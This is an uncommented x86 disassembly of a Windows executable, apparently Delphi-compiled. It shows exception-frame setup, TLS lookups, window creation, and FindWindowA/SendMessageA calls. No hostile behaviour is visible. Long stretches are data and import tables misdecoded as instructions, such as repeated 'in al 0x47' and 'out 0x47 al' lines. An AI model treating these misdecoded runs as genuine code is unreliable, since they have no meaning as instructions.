mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401264
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404158
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402bd4
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405bbd
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
xor ebx ebx
sub_405bc4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405c0e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c15
retn
mov eax rw-data
call sub_402a30
mov eax rw-data
call sub_402a30
mov eax rw-data
call sub_402a30
call sub_401ae0
sub_405c18
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404cb4
call sub_402fe0
test al al
je r-xdata
call sub_4030d4
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40132c
mov [ rw-data ] eax
call sub_401314
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403010
call sub_40128c
call sub_405b50
mov [ rw-data ] eax
call sub_401314
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40128c
call sub_405b50
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40130c
mov [ rw-data ] eax
sub_405d20
push ebx
call sub_405d18
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405d0c
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403edc
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403edc
sub_405d64
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405d20
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405db0
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405cec
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405da4
mov edx rw-data
mov eax ebx
call sub_403c30
pop ebx
retn
sub_405df4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e20
retn
sub_405e50
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405e6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e98
retn
sub_405ea4
test al 0x5e
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
pop esi
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
jecxz r-xdata
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x1025ffc0 ] cl
jecxz r-xdata
inc edi
jb r-xdata
jb r-xdata
je r-xdata
inc edi
add [ ebx - 0x17da0040 ] cl
loop r-xdata
inc edi
add [ ebx + 0xc25ffc0 ] cl
jecxz r-xdata
sar bh 0x25
or al 0xe3
inc edi
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
inc edi
add [ ebx - 0x3fda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x1bda0040 ] cl
loop r-xdata
inc edi
add [ ebx + 0x825ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x425ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x1c25ffc0 ] cl
jecxz r-xdata
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
inc edi
add [ ebx - 0x3da0040 ] cl
loop r-xdata
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
inc edi
add [ ebx - 0x67da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x43da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x1fda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x23da0040 ] cl
loop r-xdata
inc edi
add [ ebx + 0x25ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x1825ffc0 ] cl
jecxz r-xdata
mov eax eax
nop
pop eax
pop edi
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
inc edi
add [ ebx - 0x2bda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x7da0040 ] cl
loop r-xdata
je r-xdata
inc edi
add [ ebx + 0x7025ffc0 ] cl
loop r-xdata
inc edi
add [ ebx - 0x6bda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x47da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x4bda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x27da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0xfda0040 ] cl
loop r-xdata
inc edi
add [ ebx + 0x1425ffc0 ] cl
inc edi
add [ ebx - 0x53da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x2fda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0xbda0040 ] cl
loop r-xdata
mov eax eax
add esp [ esi + ebx * 2 - 0x3f74ffc0 ]
inc edi
add [ ebx + 0x4825ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x6c25ffc0 ] cl
loop r-xdata
inc edi
add [ ebx - 0x6fda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x73da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x4fda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x37da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x13da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x7bda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x57da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x33da0040 ] cl
loop r-xdata
inc edi
add [ ebx + 0x2025ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x4425ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x6825ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x6425ffc0 ] cl
loop r-xdata
inc edi
add [ ebx - 0x77da0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x5fda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x3bda0040 ] cl
loop r-xdata
inc edi
add [ ebx + 0x5c25ffc0 ] cl
loop r-xdata
inc edi
add [ ebx - 0x7fda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x5bda0040 ] cl
loop r-xdata
inc edi
add [ ebx - 0x7da0040 ] cl
jecxz r-xdata
add [ ebx + 0x7025ffc0 ] cl
in al 0x47
inc edi
add [ ebx + 0x1c25ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x4025ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x3c25ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x6025ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x7825ffc0 ] cl
loop r-xdata
inc edi
add [ ebx - 0x63da0040 ] cl
loop r-xdata
inc edi
add [ ebx + 0x3425ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x5825ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x7c25ffc0 ] cl
loop r-xdata
inc edi
add [ ebx - 0x2fda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0xbda0040 ] cl
jecxz r-xdata
add [ ebx + 0x6c25ffc0 ] cl
in al 0x47
inc edi
add [ ebx + 0x1825ffc0 ] cl
loop r-xdata
add [ ebx + 0x6825ffc0 ] cl
in al 0x47
inc edi
add [ ebx + 0x3025ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x3825ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x5025ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x7425ffc0 ] cl
loop r-xdata
add [ ebx + 0x6025ffc0 ] cl
in al 0x47
inc edi
add [ ebx + 0x2825ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x3025ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x5425ffc0 ] cl
loop r-xdata
inc edi
add [ ebx - 0x57da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x33da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0xfda0040 ] cl
jecxz r-xdata
add [ ebx + 0x6425ffc0 ] cl
in al 0x47
inc edi
add [ ebx + 0x2c25ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x7425ffc0 ] cl
in al 0x47
inc edi
add [ ebx + 0x2825ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x4c25ffc0 ] cl
loop r-xdata
add [ ebx + 0x5c25ffc0 ] cl
in al 0x47
add [ ebx + 0x5825ffc0 ] cl
in al 0x47
add [ ebx + 0x5425ffc0 ] cl
in al 0x47
add [ ebx + 0x5025ffc0 ] cl
in al 0x47
add [ ebx + 0x4c25ffc0 ] cl
in al 0x47
add [ ebx + 0x4825ffc0 ] cl
in al 0x47
add [ ebx + 0x4425ffc0 ] cl
in al 0x47
add [ ebx + 0x4025ffc0 ] cl
in al 0x47
add [ ebx + 0x3c25ffc0 ] cl
in al 0x47
add [ ebx + 0x3825ffc0 ] cl
in al 0x47
add [ ebx + 0x3425ffc0 ] cl
in al 0x47
add [ ebx + 0x3025ffc0 ] cl
in al 0x47
add [ ebx + 0x2c25ffc0 ] cl
in al 0x47
add [ ebx + 0x2825ffc0 ] cl
in al 0x47
add [ ebx + 0x2425ffc0 ] cl
in al 0x47
add [ ebx + 0x2025ffc0 ] cl
in al 0x47
add [ ebx + 0x1c25ffc0 ] cl
in al 0x47
add [ ebx + 0x1825ffc0 ] cl
in al 0x47
add [ ebx + 0x1425ffc0 ] cl
in al 0x47
add [ ebx + 0x1025ffc0 ] cl
in al 0x47
add [ ebx + 0xc25ffc0 ] cl
in al 0x47
add [ ebx + 0x825ffc0 ] cl
in al 0x47
add [ ebx + 0x425ffc0 ] cl
in al 0x47
add [ ebx + 0x25ffc0 ] cl
in al 0x47
add [ ebx - 0x3da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x7c25ffc0 ] cl
in al 0x47
add [ ebx - 0x7fda0040 ] cl
in al 0x47
inc edi
add [ ebx + 0x2c25ffc0 ] cl
loop r-xdata
inc edi
add [ ebx - 0x7fda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x5bda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x37da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x13da0040 ] cl
jecxz r-xdata
add [ ebx + 0x7825ffc0 ] cl
in al 0x47
inc edi
add [ ebx + 0x2425ffc0 ] cl
loop r-xdata
inc edi
add [ ebx + 0x5825ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x7c25ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x5fda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x3bda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x17da0040 ] cl
jecxz r-xdata
add [ ebx + 0x425ffc0 ] cl
out 0x47 eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x7825ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x63da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x3fda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x1bda0040 ] cl
jecxz r-xdata
add [ ebx - 0x7da0040 ] cl
out 0x47 al
inc edi
add [ ebx + 0x5025ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x7425ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x67da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x43da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x1fda0040 ] cl
jecxz r-xdata
add [ ebx - 0x13da0040 ] cl
out 0x47 al
inc edi
add [ ebx + 0x4c25ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x7025ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x6bda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x47da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x23da0040 ] cl
jecxz r-xdata
add [ ebx - 0x17da0040 ] cl
out 0x47 al
inc edi
add [ ebx + 0x4825ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x6c25ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x6fda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x4bda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x27da0040 ] cl
jecxz r-xdata
add [ ebx - 0x1bda0040 ] cl
out 0x47 al
inc edi
add [ ebx + 0x4425ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x6825ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x73da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x4fda0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x2bda0040 ] cl
jecxz r-xdata
add [ ebx - 0x1fda0040 ] cl
out 0x47 al
inc edi
add [ ebx + 0x4025ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x6425ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x77da0040 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x53da0040 ] cl
jecxz r-xdata
add [ ebx - 0xbda0040 ] cl
out 0x47 al
inc edi
add [ ebx + 0x3c25ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x6025ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx - 0x7bda0040 ] cl
jecxz r-xdata
add [ ebx - 0xfda0040 ] cl
out 0x47 al
inc edi
add [ ebx + 0x3825ffc0 ] cl
jecxz r-xdata
inc edi
add [ ebx + 0x5c25ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x25ffc0 ] cl
out 0x47 eax
add [ ebx - 0x3da0040 ] cl
out 0x47 al
add [ ebx - 0x23da0040 ] cl
out 0x47 al
add [ ebx - 0x27da0040 ] cl
out 0x47 al
add [ ebx - 0x2bda0040 ] cl
out 0x47 al
add [ ebx - 0x2fda0040 ] cl
out 0x47 al
add [ ebx - 0x33da0040 ] cl
out 0x47 al
add [ ebx - 0x37da0040 ] cl
out 0x47 al
add [ ebx - 0x3bda0040 ] cl
out 0x47 al
add [ ebx - 0x3fda0040 ] cl
out 0x47 al
add [ ebx - 0x43da0040 ] cl
out 0x47 al
add [ ebx - 0x47da0040 ] cl
out 0x47 al
add [ ebx - 0x4bda0040 ] cl
out 0x47 al
add [ ebx - 0x4fda0040 ] cl
out 0x47 al
add [ ebx - 0x53da0040 ] cl
out 0x47 al
add [ ebx - 0x57da0040 ] cl
out 0x47 al
add [ ebx - 0x5bda0040 ] cl
out 0x47 al
add [ ebx - 0x5fda0040 ] cl
out 0x47 al
add [ ebx - 0x63da0040 ] cl
out 0x47 al
add [ ebx - 0x67da0040 ] cl
out 0x47 al
add [ ebx - 0x6bda0040 ] cl
out 0x47 al
add [ ebx - 0x6fda0040 ] cl
out 0x47 al
add [ ebx - 0x73da0040 ] cl
out 0x47 al
add [ ebx - 0x77da0040 ] cl
out 0x47 al
add [ ebx - 0x7bda0040 ] cl
out 0x47 al
add [ ebx - 0x7fda0040 ] cl
out 0x47 al
add [ ebx + 0x7c25ffc0 ] cl
out 0x47 al
add [ ebx + 0x7825ffc0 ] cl
out 0x47 al
add [ ebx + 0x7425ffc0 ] cl
out 0x47 al
add [ ebx + 0x7025ffc0 ] cl
out 0x47 al
add [ ebx + 0x6c25ffc0 ] cl
out 0x47 al
add [ ebx + 0x6825ffc0 ] cl
out 0x47 al
add [ ebx + 0x6425ffc0 ] cl
out 0x47 al
add [ ebx + 0x6025ffc0 ] cl
out 0x47 al
add [ ebx + 0x5c25ffc0 ] cl
out 0x47 al
add [ ebx + 0x5825ffc0 ] cl
out 0x47 al
add [ ebx + 0x5425ffc0 ] cl
out 0x47 al
add [ ebx + 0x5025ffc0 ] cl
out 0x47 al
add [ ebx + 0x4c25ffc0 ] cl
out 0x47 al
add [ ebx + 0x4825ffc0 ] cl
out 0x47 al
add [ ebx + 0x4425ffc0 ] cl
out 0x47 al
add [ ebx + 0x4025ffc0 ] cl
out 0x47 al
add [ ebx + 0x3c25ffc0 ] cl
out 0x47 al
add [ ebx + 0x3825ffc0 ] cl
out 0x47 al
add [ ebx + 0x3425ffc0 ] cl
out 0x47 al
add [ ebx + 0x3025ffc0 ] cl
out 0x47 al
add [ ebx + 0x2c25ffc0 ] cl
out 0x47 al
add [ ebx + 0x2825ffc0 ] cl
out 0x47 al
add [ ebx + 0x2425ffc0 ] cl
out 0x47 al
add [ ebx + 0x2025ffc0 ] cl
out 0x47 al
add [ ebx + 0x1c25ffc0 ] cl
out 0x47 al
add [ ebx + 0x1825ffc0 ] cl
out 0x47 al
add [ ebx + 0x1425ffc0 ] cl
out 0x47 al
add [ ebx + 0x1025ffc0 ] cl
out 0x47 al
add [ ebx + 0xc25ffc0 ] cl
out 0x47 al
add [ ebx + 0x825ffc0 ] cl
out 0x47 al
add [ ebx + 0x425ffc0 ] cl
out 0x47 al
add [ ebx + 0x25ffc0 ] cl
out 0x47 al
add [ ebx - 0x3da0040 ] cl
in eax 0x47
add [ ebx - 0x7da0040 ] cl
in eax 0x47
add [ ebx - 0xbda0040 ] cl
in eax 0x47
add [ ebx - 0xfda0040 ] cl
in eax 0x47
add [ ebx - 0x13da0040 ] cl
in eax 0x47
add [ ebx - 0x17da0040 ] cl
in eax 0x47
add [ ebx - 0x1bda0040 ] cl
in eax 0x47
add [ ebx - 0x1fda0040 ] cl
in eax 0x47
add [ ebx - 0x23da0040 ] cl
in eax 0x47
add [ ebx - 0x27da0040 ] cl
in eax 0x47
add [ ebx - 0x2bda0040 ] cl
in eax 0x47
add [ ebx - 0x2fda0040 ] cl
in eax 0x47
add [ ebx - 0x33da0040 ] cl
in eax 0x47
add [ ebx - 0x37da0040 ] cl
in eax 0x47
add [ ebx - 0x3bda0040 ] cl
in eax 0x47
add [ ebx - 0xfda0040 ] cl
in eax 0x47
add [ ebx - 0x3fda0040 ] cl
in eax 0x47
add [ ebx - 0x43da0040 ] cl
in eax 0x47
add [ ebx - 0x47da0040 ] cl
in eax 0x47
add [ ebx - 0x4bda0040 ] cl
in eax 0x47
add [ ebx - 0x4fda0040 ] cl
in eax 0x47
add [ ebx - 0x53da0040 ] cl
in eax 0x47
add [ ebx - 0x53da0040 ] cl
in eax 0x47
add [ ebx - 0x57da0040 ] cl
in eax 0x47
add [ ebx - 0x5bda0040 ] cl
in eax 0x47
add [ ebx - 0x5fda0040 ] cl
in eax 0x47
add [ ebx - 0x63da0040 ] cl
in eax 0x47
add [ ebx - 0x67da0040 ] cl
in eax 0x47
add [ ebx - 0x6bda0040 ] cl
in eax 0x47
add [ ebx - 0x6fda0040 ] cl
in eax 0x47
add [ ebx - 0x73da0040 ] cl
in eax 0x47
add [ ebx - 0x77da0040 ] cl
in eax 0x47
add [ ebx - 0x7bda0040 ] cl
in eax 0x47
add [ ebx - 0x7fda0040 ] cl
in eax 0x47
add [ ebx + 0x7c25ffc0 ] cl
in eax 0x47
add [ ebx + 0x7825ffc0 ] cl
in eax 0x47
add [ ebx + 0x7425ffc0 ] cl
in eax 0x47
add [ ebx + 0x7025ffc0 ] cl
in eax 0x47
add [ ebx + 0x6c25ffc0 ] cl
in eax 0x47
add [ ebx + 0x6825ffc0 ] cl
in eax 0x47
add [ ebx + 0x6425ffc0 ] cl
in eax 0x47
add [ ebx + 0x6025ffc0 ] cl
in eax 0x47
add [ ebx + 0x5c25ffc0 ] cl
in eax 0x47
add [ ebx + 0x5825ffc0 ] cl
in eax 0x47
add [ ebx + 0x5425ffc0 ] cl
in eax 0x47
add [ ebx + 0x5025ffc0 ] cl
in eax 0x47
add [ ebx + 0x4c25ffc0 ] cl
in eax 0x47
add [ ebx + 0x4825ffc0 ] cl
in eax 0x47
add [ ebx + 0x4425ffc0 ] cl
in eax 0x47
add [ ebx + 0x4025ffc0 ] cl
in eax 0x47
add [ ebx + 0x3c25ffc0 ] cl
in eax 0x47
add [ ebx + 0x3825ffc0 ] cl
in eax 0x47
add [ ebx + 0x3425ffc0 ] cl
in eax 0x47
add [ ebx + 0x3025ffc0 ] cl
in eax 0x47
add [ ebx + 0x2c25ffc0 ] cl
in eax 0x47
add [ ebx + 0x2825ffc0 ] cl
in eax 0x47
add [ ebx + 0x2425ffc0 ] cl
in eax 0x47
add [ ebx + 0x2025ffc0 ] cl
in eax 0x47
add [ ebx + 0x1c25ffc0 ] cl
in eax 0x47
add [ ebx + 0x1825ffc0 ] cl
in eax 0x47
add [ ebx + 0x1425ffc0 ] cl
in eax 0x47
add [ ebx + 0x1025ffc0 ] cl
in eax 0x47
add [ ebx + 0xc25ffc0 ] cl
in eax 0x47
add [ ebx + 0x825ffc0 ] cl
in eax 0x47
add [ ebx + 0x425ffc0 ] cl
in eax 0x47
add [ ebx + 0x25ffc0 ] cl
in eax 0x47
add [ ebx - 0x3da0040 ] cl
in al 0x47
add [ ebx - 0x7da0040 ] cl
in al 0x47
add [ ebx - 0xbda0040 ] cl
in al 0x47
add [ ebx - 0xfda0040 ] cl
in al 0x47
add [ ebx - 0x13da0040 ] cl
in al 0x47
add [ ebx - 0x17da0040 ] cl
in al 0x47
add [ ebx - 0x1bda0040 ] cl
in al 0x47
add [ ebx - 0x1fda0040 ] cl
in al 0x47
add [ ebx - 0x23da0040 ] cl
in al 0x47
add [ ebx - 0x27da0040 ] cl
in al 0x47
add [ ebx - 0x2bda0040 ] cl
in al 0x47
add [ ebx - 0x2fda0040 ] cl
in al 0x47
add [ ebx - 0x33da0040 ] cl
in al 0x47
add [ ebx - 0x37da0040 ] cl
in al 0x47
add [ ebx - 0x3bda0040 ] cl
in al 0x47
add [ ebx - 0x3fda0040 ] cl
in al 0x47
add [ ebx - 0x43da0040 ] cl
in al 0x47
add [ ebx - 0x47da0040 ] cl
in al 0x47
add [ ebx - 0x4bda0040 ] cl
in al 0x47
add [ ebx - 0x4fda0040 ] cl
in al 0x47
add [ ebx - 0x53da0040 ] cl
in al 0x47
add [ ebx - 0x57da0040 ] cl
in al 0x47
add [ ebx - 0x5bda0040 ] cl
in al 0x47
add [ ebx - 0x5fda0040 ] cl
in al 0x47
add [ ebx - 0x63da0040 ] cl
in al 0x47
add [ ebx - 0x67da0040 ] cl
in al 0x47
add [ ebx - 0x6bda0040 ] cl
in al 0x47
add [ ebx - 0x6fda0040 ] cl
in al 0x47
add [ ebx - 0x73da0040 ] cl
in al 0x47
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
inc edi
add [ ebx + 0x825ffc0 ] cl
out 0x47 eax
sub_406a28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402950
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402940
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406a80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402950
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402940
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406ad8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406bcd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406bf5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406bfc
retn
sub_406c08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406c2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c34
retn
sub_406c40
salc
inc edi
add al dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl ah
inc [ eax ]
